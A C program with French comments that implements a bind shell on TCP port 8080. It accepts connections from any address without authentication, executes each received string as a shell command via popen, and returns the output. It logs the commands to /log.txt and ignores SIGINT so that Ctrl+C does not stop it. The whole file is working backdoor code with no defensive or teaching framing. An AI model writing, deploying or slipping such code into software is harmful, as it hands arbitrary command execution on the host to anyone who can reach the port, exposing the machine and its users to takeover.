#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>

#define PORT 8080

void log_command(char* command) {
    FILE* log_file = fopen("/log.txt", "a");
    time_t current_time;
    char* time_string;
    time(&current_time);
    time_string = ctime(&current_time);
    time_string[strlen(time_string)-1] = '\0'; // enlever le caractère de fin de ligne
    fprintf(log_file, "[%s] %s\n", time_string, command);
    fclose(log_file);
}

int main(int argc, char const *argv[]) {
    int server_fd, new_socket, valread;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[1024];
        // Création de la socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket échouée");
        exit(EXIT_FAILURE);
    }

    // Configuration de la socket pour réutiliser l'adresse IP et le port
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Attachement de la socket au port 8080
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind échouée");
        exit(EXIT_FAILURE);
    }

    // Écoute de la socket pour les connexions entrantes
    if (listen(server_fd, 3) < 0) {
        perror("listen échouée");
        exit(EXIT_FAILURE);
    }

    // Masquer les signaux SIGINT pour ne pas être fermé par CTRL+c
    signal(SIGINT, SIG_IGN);

    // Boucle d'attente des connexions et de traitement des commandes
    while(1) {
        // Accepter une nouvelle connexion
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            perror("accept échouée");
            exit(EXIT_FAILURE);
        }

        // Boucle de traitement des commandes
        while(1) {
            memset(buffer, 0, sizeof(buffer));
            valread = read(new_socket, buffer, 1024);
            if (valread <= 0) {
                // La connexion a été fermée ou une erreur s'est produite
                break;
            }
            // Ajouter la commande au fichier de log
            log_command(buffer);
            // Exécuter la commande et envoyer le résultat au client
            FILE* command_output = popen(buffer, "r");
            char output_buffer[1024] = {0};
            while (fgets(output_buffer, sizeof(output_buffer), command_output) != NULL) {
                send(new_socket, output_buffer, strlen(output_buffer), 0);
            }
            pclose(command_output);
        }

        // Fermer la connexion
        close(new_socket);
    }

    return 0;
}
